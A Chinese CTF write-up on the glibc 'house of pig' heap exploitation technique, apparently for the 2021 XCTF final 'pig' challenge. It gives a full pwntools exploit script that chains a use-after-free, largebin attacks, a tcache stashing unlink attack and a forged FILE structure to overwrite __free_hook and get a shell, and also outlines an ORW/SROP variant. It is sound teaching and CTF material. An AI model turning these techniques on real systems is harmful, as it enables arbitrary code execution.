house of pig
============

[原理详解](https://blog.csdn.net/qq_54218833/article/details/128575508)  
[题目详解](https://a1ex.online/2021/06/30/2021-XCTF-final%E9%A2%98%E8%A7%A3/)  
**\_IO\_str\_jumps中的\_IO\_str\_overflow**

核心
==

利用\_IO\_str\_overflow的malloc,memcpy,free三连，设置FAKE\_FILE的值，使得free\_hook被覆盖为system函数，最后free就可以拿到shell，怎么设置看源代码的函数执行流程

例题
==

**house of pig**  
主要是利用了largebin attack,tcache stashing unlink attack，伪造FILE结构等手法

- 题目分析：
    
    
    1. 这个题是个C++代码，对于笔者分析还是有不小难度，但是对于逆向来说，我们不要在乎那么多细节，抓住核心利用点，这才是关键。
    2. 这个题用栈来存储chunk的相关数据，与之前总是用全局变量来存储有所不同，所以一开始看的我很晕，而且ida反汇编C++的东西又不好看，导致很多时间在纠结一些细节，但不要忘记堆就几个关键，**chunklist,sizelist,marklist**，这个题也不例外，抓住这点就够了
    3. 这个题**在change role时候把原本的chunk相关数据copy到mmap\_addr，但是没有copy完全，这就是漏洞利用点**。可以很明显看到edit,show都是只看mark1,不看mark2,但是copy没有拷贝mark1中的数据，那么再次切换回来就会让mark1=0（因为mmap中的数据本身就是0），这就有了uaf
    4. peppa(A) 0-19 calloc(0x90-0x430)  
        mummy(B) 0-9 calloc(0x90-0x450)  
        daddy(C) 0-4 calloc(0x90-0x440) if(add&amp;&amp;i==4) 再malloc(0xe8)
    5. 这个题还有个点要注意，平时read都是可以控制整个mem区域，但这个题又做了一个限制。把控制的mem以每0x30为一块，A只可写每块的0-0x10,B只可写每块的0x10-0x20,C只可写每块的0x20-0x30。**虽然做了限制，但是也给人启发，A相当于控制fd,bk;B相当于控制fd\_nextsize,bk\_nextsize**
- 攻击流程
    
    
    1. 为tcache stashing unlink attack做准备，tcache中5个，smallbin中2个，大小都为0xa0
    2. 利用largebin泄露libcbase,heapbase。泄露libcbase就是把largebin chunk free后进入unsorted bin，uaf很容易泄露libcbase。泄露heapbase就是再calloc一个比它还大的chunk让它进入largebin，覆盖它的fd,bk，show就是它的fd\_nextsize，dbg一看一做差就可以了
    3. largebin attack向free\_hook-0x8处写入一个堆地址，这是为了绕过tcache stashing unlink attack的检查。具体做法是先让一个size大的chunk进入largebin,edit它的bk\_nextsize为free\_hook-0x28，再让一个size比它小的chunk先进入unsorted bin再链入largebin即可
    4. 再一次largebin attack向\_IO\_list\_all写入一个堆地址，**要记住这个堆地址，因为我们还要将它申请出来伪造FILE结构**，方法同上
    5. tcache stashing unlink attack将free\_hook-0x10链入0xa0的chunk大小的tcache中。让修改smallbin的第一个chunk的bk指针修改为free\_hook-0x10-0x10，触发tcache stashing unlink attack。注意这里的细节，free\_hook-0x8（也就是target+0x8）在之前被修改为了一个堆地址，所以可写，不会引发异常
    6. 在触发tcache stashing unlink attack时，add的时候i要刚好为4，此时刚好malloc(0xe8)。**在此题中\_IO\_list\_all写入一个堆地址是一个FAKE FILE，但是它的编写受限制，因此将其的\*chain指向一个堆地址，再malloc(0xe8)刚好将这个堆地址申请出来，这里才是我们存放\_IO\_str\_overflow的vtable的FAKE FILE!!!**
    7. 在change\_role中输入空字符触发len检查调用exit函数，进而执行\_IO\_str\_overflow函数
    8. exit函数会执行\_IO\_flush\_all\_lockp函数来遍历 FILE结构体，而其中就有\_IO\_str\_overflow函数，因此要满足(fp-&gt;\_mode &lt;= 0 &amp;&amp; fp-&gt;\_IO\_write\_ptr &gt; fp-&gt;\_IO\_write\_base)才能让那个if语句执行到\_IO\_str\_overflow
    9. 在\_IO\_str\_overflow函数中malloc,memcpy,free三连（具体细节看源码）old\_blen = \_IO\_blen (fp);new\_size = 2 \* old\_blen + 0x64; malloc (new\_size);**注意这个malloc正是想要malloc出0xa0 chunk大小的tcache头部存的free\_hook-0x10**,因此IO\_buf\_end，IO\_buf\_base，要精心设计。memcpy (new\_buf, old\_buf, old\_blen);free (old\_buf);**因此IO\_buf\_base要刚好是FAKE FILE中/bin/sh\\x00的地址（是个堆地址）**
    10. 在写exp的途中要注意修改smallbin的bk指针，largebin中的bk\_nextsize指针时如果破坏了要注意修复。同时还要注意各个bin当前的状态不要和预期的状态不一样。也要注意算FILE的偏移要不要0x10这个问题

```python
from pwn import *
from pwnlib.util.packing import p64
from pwnlib.util.packing import u64
context(os='linux', arch='amd64', log_level='debug')
file = "/home/zp9080/PWN/pig"
elf=ELF(file)
libc =elf.libc
io = process(file)
def dbg():
    gdb.attach(io,'b *$rebase(0xD80)')

rl = lambda    a=False        : io.recvline(a)
ru = lambda a,b=True    : io.recvuntil(a,b)
rn = lambda x            : io.recvn(x)
sn = lambda x            : io.send(x)
sl = lambda x            : io.sendline(x)
sa = lambda a,b            : io.sendafter(a,b)
sla = lambda a,b        : io.sendlineafter(a,b)
irt = lambda            : io.interactive()
dbg = lambda text=None  : gdb.attach(io, text)
lg = lambda s            : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
uu64 = lambda data        : u64(data.ljust(8, b'\x00'))

def dbg():
    gdb.attach(io, 'b *$rebase(0x3761)')

def Menu(cmd):
    sla('Choice: ', str(cmd))

def Add(size, content):
    Menu(1)
    sla('size: ', str(size))
    sla('message: ', content)

def Show(idx):
    Menu(2)
    sla('index: ', str(idx))

def Edit(idx, content):
    Menu(3)
    sla('index: ', str(idx))
    sa('message: ', content)

def Del(idx):
    Menu(4)
    sla('index: ', str(idx))

def Change(user):
    Menu(5)
    if user == 1:
        sla('user:\n', 'A\x01\x95\xc9\x1c')
    elif user == 2:
        sla('user:\n', 'B\x01\x87\xc3\x19')
    elif user == 3:
        sla('user:\n', 'C\x01\xf7\x3c\x32')

#----- prepare tcache_stashing_unlink_attack 
#calloc申请5个0xa0堆块，并放入 tcache
Change(2)
for x in range(5):
    Add(0x90, 'B'*0x28) # B0~B4
    Del(x)    #B0~B4

#role1 calloc(0x150)，用于切割出0xa0的small bin chunk
Change(1)
Add(0x150, 'A'*0x68) # A0
#填充0x160 tcache，使得 A0进入 unsortedbin
for x in range(7):
    Add(0x150, 'A'*0x68) # A1~A7
    Del(1+x)
#A0放入 unsortedbin
Del(0)

#切割 A0，剩余0xa0放入smallbin
Change(2)
Add(0xb0, 'B'*0x28) # B5 split 0x160 to 0xc0 and 0xa0

#同样道理 利用0x190切割 0xa0放入 smallbin
Change(1)
Add(0x180, 'A'*0x78) # A8
for x in range(7):
    Add(0x180, 'A'*0x78) # A9~A15
    Del(9+x)
Del(8)

Change(2)
Add(0xe0, 'B'*0x38) # B6 split 0x190 to 0xf0 and 0xa0

#----- leak libc_base and heap_base
#role1 calloc(0x430)，用于放入largbin，泄漏地址
Change(1)
Add(0x430, 'A'*0x158) # A16

#间隔top chunk
Change(2)
Add(0xf0, 'B'*0x48) # B7

#释放A16进入unsorted bin
Change(1)
Del(16)

#使 A16 进入 largebin
Change(2)
Add(0x440, 'B'*0x158) # B8
#利用 UAF先泄漏 libc地址
Change(1)
Show(16)
ru('message is: ')
libc_base = uu64(rl()) - 0x1ebfe0
lg('libc_base')
#利用UAF泄漏heapbase地址
Edit(16, 'A'*0xf+'\n')
Show(16)
ru('message is: '+'A'*0xf+'\n')
heap_base = uu64(rl()) - 0x13940
lg('heap_base')

print("---> 1 largbin attack to change __free_hook-8")
#----- first largebin_attack
# recover,fd,bk不对的话在largebin中找不到
Edit(16, 2*p64(libc_base+0x1ebfe0) + b'\n') 
#A17直接largebin中得到(A16)
Add(0x430, 'A'*0x158) # A17
Add(0x430, 'A'*0x158) # A18
Add(0x430, 'A'*0x158) # A19
Change(2)
#释放 0x450堆块 chunk8
Del(8)
#使得 chunk8 进入 largebin
Add(0x450, 'B'*0x168) # B9

#释放0x440堆块进入 unsortedbin，其size 小于 chunk8
Change(1)
Del(17)
#修改chunk8->bk_nextsize = free_hook-0x28
Change(2)
free_hook = libc_base + libc.sym['__free_hook']
Edit(8, p64(0) + p64(free_hook-0x28) + b'\n')
#触发largebin attack
Change(3)
#注意B8的大小是0x450，这里不能add(0x440)
#只要触发了unsortedbin循环就可以，unsorted bin中的large chunk会先被放入largebin再拿出来切割
Add(0xa0, 'C'*0x28) # C0 triger largebin_attack, write a heap addr to __free_hook-8
#修复chunk8
Change(2)
# recover B8的fd-nextsize,bk-nextsize指向自己
#此时largebin中只有B8，配合下一次largebin attack
Edit(8, 2*p64(heap_base+0x13e80) + b'\n') 

print("---> 2 largebin attack to change _IO_list_all")
#----- second largebin_attack
#将unsortedbin 清空
Change(3)
Add(0x380, 'C'*0x118) # C1
#释放A19 0x440到unsortedbin中
Change(1)
Del(19)
#修改chunk8->bk_nextsize = io_list_all-0x20
Change(2)
IO_list_all = libc_base + libc.sym['_IO_list_all']
Edit(8, p64(0) + p64(IO_list_all-0x20) + b'\n')
#触发largebin attack
Change(3)
Add(0xa0, 'C'*0x28) # C2 triger largebin_attack, write a heap addr to _IO_list_all
#修复largebin
Change(2)
Edit(8, 2*p64(heap_base+0x13e80) + b'\n') # recover

print("==== tcache stashing unlink attack and FILE attack")
#----- tcache_stashing_unlink_attack and FILE attack
#修改smallbin 中的第一个chunk的 bk指针为 free_hook-0x20,smallbin: chunk8->chunk7
#target-0x10=free_hook-0x20,target=free_hook-0x10,free_hook-0x8可写，因为之前将其写入了一个堆地址
Change(1)
#这个地方要留意，A8为calloc(0x180),又被分割,calloc(0xe0)，而B每次只能写入0x10-0x20的位置
#0x10 0x40 0x70 0xa0 0xd0 0x100   0x190=0x10+0xe0+0xa0，所以这个payload刚好可以实现修改smallbin 中的第一个chunk的 bk指针，注意fd不要改变
payload = b'A'*0x50 + p64(heap_base+0x12280) + p64(free_hook-0x20)
Edit(8, payload + b'\n')

#申请largebin中的chunk8,用来伪造一个FILE结构体，并将FILE结构体的chain指针指向另一个伪造的FILE结构体堆块，这里不直接用它伪造是因为该堆块限制写,因此让
#这个地方的FILE结构体的chain指针指向当前unsorted bin中残留的chunk头部
Change(3)
#刚好是FAKE FILE的0x68处，也就是*chain写入这个堆地址
payload = b'\x00'*0x18 + p64(heap_base+0x147c0)
payload = payload.ljust(0x158, b'\x00')
print("change fake FILE chain")
#unsorted bin中的heap_base+0x147c0进入了small bin
#largebin中的chunk被取出,同时这也是_IO_list_all[0]存的堆地址
Add(0x440, payload) # C3 change fake FILE _chain

#触发tcache stashing unlink
print("triger tcache_stashing_unlink")
# dbg()
#从smallbin取出一个chunk同时触发tcache_stashing_unlink_attack
Add(0x90, 'C'*0x28) # C4 triger tcache_stashing_unlink_attack, put the chunk of __free_hook-0x8处的chunk into tcache

IO_str_vtable = libc_base + 0x1ED560
system_addr = libc_base + libc.sym['system']
#因为返回的是mem位置，也就heap_base+0x147c0+0x10,所以只有2个p64(0)
fake_IO_FILE = 2*p64(0)
fake_IO_FILE += p64(1)                      #_IO_write_base = 1
fake_IO_FILE += p64(0x1000)                 # _IO_write_ptr = 0x1000 
fake_IO_FILE += p64(0)                      #_IO_write_end=0
#_IO_write_ptr -_IO_write_base>(size_t)(IO_buf_end-IO_buf_base)+flush_only 同时
fake_IO_FILE += p64(heap_base+0x148a0)                #IO_buf_base，heap_base+0x147c0+0xd0
fake_IO_FILE += p64(heap_base+0x148b8)                #IO_buf_end,  heap_base+0x147c0+0xd0+0x18
fake_IO_FILE = fake_IO_FILE.ljust(0xb0, b'\x00')
fake_IO_FILE += p64(0)                    #change _mode = 0
fake_IO_FILE = fake_IO_FILE.ljust(0xc8, b'\x00')
fake_IO_FILE += p64(IO_str_vtable)        #change vtable
payload = fake_IO_FILE + b'/bin/sh\x00' + 2*p64(system_addr)
print('IO attack')
sa('Gift:', payload)

#触发exit(-1)
Menu(5)
sla('user:\n', '')

irt()
```

源码
==

- 至于我们如何让程序执行\_IO\_str\_overflow这个函数，很简单。这个函数的地址是保存在\_IO\_str\_jumps这个结构体中的，在一般程序正常运行的情况下，\_IO\_list\_all保存有指向标准输入输出的FILE结构体，其中的vtable指向的应该是\_IO\_file\_jumps，而\_IO\_file\_jumps与\_IO\_str\_jumps是一个结构体类型的实例，二者的不同之处是，\_IO\_file\_jumps用于一个FILE结构体在出现异常时调用的函数列表，我们在假FILE结构体中将vtable写成\_IO\_str\_jumps，实际上就是将程序的执行流从\_IO\_file\_overflow改成\_IO\_str\_overflow。这也是house of pig利用的思想精髓所在

**注意要找的是\_\_io\_vtables而不是call \_IO\_str\_overflow,否则与FILE结构体的\_IO\_jump\_t的类型不匹配**

```text
pwndbg> p &_IO_str_jumps
$6 = (const _IO_jump_t *) 0x7ffff7dd2560 <_IO_str_jumps>
```

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-2eefc14144b5081565a63423066916a8e0be6f99.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-a6010f8e6102c2b440383e32c7ce0de321034b53.png)

\_IO\_str\_overflow
-------------------

```C
//在攻击中fp->_flags==0,注意函数的流程
#define EOF (-1)
#define _IO_blen(fp) ((fp)->_IO_buf_end - (fp)->_IO_buf_base)
int _IO_str_overflow (FILE *fp, int c)
{
  int flush_only = c == EOF;
  size_t pos;
  if (fp->_flags & _IO_NO_WRITES)
      return flush_only ? 0 : EOF;
  if ((fp->_flags & _IO_TIED_PUT_GET) && !(fp->_flags & _IO_CURRENTLY_PUTTING))
    {
      fp->_flags |= _IO_CURRENTLY_PUTTING;
      fp->_IO_write_ptr = fp->_IO_read_ptr;
      fp->_IO_read_ptr = fp->_IO_read_end;
    }
  pos = fp->_IO_write_ptr - fp->_IO_write_base;
  if (pos >= (size_t) (_IO_blen (fp) + flush_only))
    {
      if (fp->_flags & _IO_USER_BUF) 
        return EOF;
      else
      {
        //这里是主要攻击函数，malloc,memcpy,free三连
      char *new_buf;
      char *old_buf = fp->_IO_buf_base;
      size_t old_blen = _IO_blen (fp);
      size_t new_size = 2 * old_blen + 0x64;
      if (new_size < old_blen)
        return EOF;
     //注意malloc特有的对齐
      new_buf = malloc (new_size);
      if (new_buf == NULL)
        {
          return EOF;
        }
      if (old_buf)
        {
        //把_IO_buf_base到_IO_buf_end中的数据复制到new_buf中，此时可以把system函数复制到free_hook中,这也是为什么tcache中存的是free_hook-0x10
          memcpy (new_buf, old_buf, old_blen);
        //_IO_buf_base中存储的是/bin/sh\x00
          free (old_buf);
          fp->_IO_buf_base = NULL;
        }
      memset (new_buf + old_blen, '\0', new_size - old_blen);

      _IO_setb (fp, new_buf, new_buf + new_size, 1);
      fp->_IO_read_base = new_buf + (fp->_IO_read_base - old_buf);
      fp->_IO_read_ptr = new_buf + (fp->_IO_read_ptr - old_buf);
      fp->_IO_read_end = new_buf + (fp->_IO_read_end - old_buf);
      fp->_IO_write_ptr = new_buf + (fp->_IO_write_ptr - old_buf);

      fp->_IO_write_base = new_buf;
      fp->_IO_write_end = fp->_IO_buf_end;
      }
    }

  if (!flush_only)
    *fp->_IO_write_ptr++ = (unsigned char) c;
  if (fp->_IO_write_ptr > fp->_IO_read_end)
    fp->_IO_read_end = fp->_IO_write_ptr;
  return c;
}
```

house of pig orw
================

[参考博客](https://www.anquanke.com/post/id/216290)

**当题目中限制了system函数的调用，可以使用此方法进行orw，但是这个方法的前提还是有hook可打**

特别之处
====

- IO\_str\_overflow中一个特别之处  
    **mov rdx,QWORD PTR \[rdi+0x28\]这条汇编指令，此时的rdi恰好指向我们伪造的IO\_FILE\_plus的头部,使得可以进行rdx的设置，进而可以使用setcontent函数进行srop**

```text
  0x7ffff7e6eb20 <__GI__IO_str_overflow>:    repz nop edx
   0x7ffff7e6eb24 <__GI__IO_str_overflow+4>:    push   r15
   0x7ffff7e6eb26 <__GI__IO_str_overflow+6>:    push   r14
   0x7ffff7e6eb28 <__GI__IO_str_overflow+8>:    push   r13
   0x7ffff7e6eb2a <__GI__IO_str_overflow+10>:    push   r12
   0x7ffff7e6eb2c <__GI__IO_str_overflow+12>:    push   rbp
   0x7ffff7e6eb2d <__GI__IO_str_overflow+13>:    mov    ebp,esi
   0x7ffff7e6eb2f <__GI__IO_str_overflow+15>:    push   rbx
   0x7ffff7e6eb30 <__GI__IO_str_overflow+16>:    sub    rsp,0x28
   0x7ffff7e6eb34 <__GI__IO_str_overflow+20>:    mov    eax,DWORD PTR [rdi]
   0x7ffff7e6eb36 <__GI__IO_str_overflow+22>:    test   al,0x8
   0x7ffff7e6eb38 <__GI__IO_str_overflow+24>:    jne    0x7ffff7e6eca0 <__GI__IO_str_overflow+384>
   0x7ffff7e6eb3e <__GI__IO_str_overflow+30>:    mov    edx,eax
   0x7ffff7e6eb40 <__GI__IO_str_overflow+32>:    mov    rbx,rdi
   0x7ffff7e6eb43 <__GI__IO_str_overflow+35>:    and    edx,0xc00
   0x7ffff7e6eb49 <__GI__IO_str_overflow+41>:    cmp    edx,0x400
   0x7ffff7e6eb4f <__GI__IO_str_overflow+47>:    je     0x7ffff7e6ec80 <__GI__IO_str_overflow+352>
   0x7ffff7e6eb55 <__GI__IO_str_overflow+53>:    mov    rdx,QWORD PTR [rdi+0x28]  <----
   0x7ffff7e6eb59 <__GI__IO_str_overflow+57>:    mov    r14,QWORD PTR [rbx+0x38]
   0x7ffff7e6eb5d <__GI__IO_str_overflow+61>:    mov    r12,QWORD PTR [rbx+0x40]
   0x7ffff7e6eb61 <__GI__IO_str_overflow+65>:    xor    ecx,ecx
   0x7ffff7e6eb63 <__GI__IO_str_overflow+67>:    mov    rsi,rdx
   0x7ffff7e6eb66 <__GI__IO_str_overflow+70>:    sub    r12,r14
   0x7ffff7e6eb69 <__GI__IO_str_overflow+73>:    cmp    ebp,0xffffffff
   0x7ffff7e6eb6c <__GI__IO_str_overflow+76>:    sete   cl
   0x7ffff7e6eb6f <__GI__IO_str_overflow+79>:    sub    rsi,QWORD PTR [rbx+0x20]
   0x7ffff7e6eb73 <__GI__IO_str_overflow+83>:    add    rcx,r12
   0x7ffff7e6eb76 <__GI__IO_str_overflow+86>:    cmp    rcx,rsi
   0x7ffff7e6eb79 <__GI__IO_str_overflow+89>:    ja     0x7ffff7e6ec4a <__GI__IO_str_overflow+298>
   0x7ffff7e6eb7f <__GI__IO_str_overflow+95>:    test   al,0x1
   0x7ffff7e6eb81 <__GI__IO_str_overflow+97>:    jne    0x7ffff7e6ecc0 <__GI__IO_str_overflow+416>
   0x7ffff7e6eb87 <__GI__IO_str_overflow+103>:    lea    r15,[r12+r12*1+0x64]
```

具体做法
====

1. 使用largebin attrack劫持stderr-&gt;\_chain字段为一个堆地址ck0
2. 使用largebin attrack劫持global\_max\_fast或者tls中管理tcache的部分为堆地址ck1，这是为了malloc从tcache中取得malloc\_hook,以及随便取一个chunk触发malloc hook
3. edit(ck1)使得0xa0 对应的tcache中为malloc\_hook，0xb0对应的chunk为任意一个堆地址
4. mov rdx,QWORD PTR \[rdi+0x28\]，rdi=FAKE FILE头部(注意FAKE FILE前0x10无法管理，但是不影响)。edit(ck0)设置FAKE FILE+0x28的值为fake frame的底部;合理地设置fp-&gt;\_IO\_write\_ptr,fp-&gt;\_IO\_write\_base,fp-&gt;\_IO\_buf\_base=一个堆地址（该堆地址的内容应该是setcontent+61），fp-&gt;\_IO\_buf\_end;chain=ck2;vtable=IO\_str\_overflow;**这样IO\_str\_overflow时malloc hook被设置为setcontent+61,rdx=fake frame底部,同时遍历下一个FILE ck2**
5. edit(ck2)使得其执行IO\_str\_overflow时可以malloc出一个0xb0的chunk
6. edit(ck3)为一个orw
7. 执行exit(0)，第一个IO\_str\_overflow可以让malloc hook被设置为setcontent+61,rdx=fake frame底部，第二个IO\_str\_overflow调用了malloc函数执行srop，让rsp=ck3的mem,rip=ret,srop结束后执行orw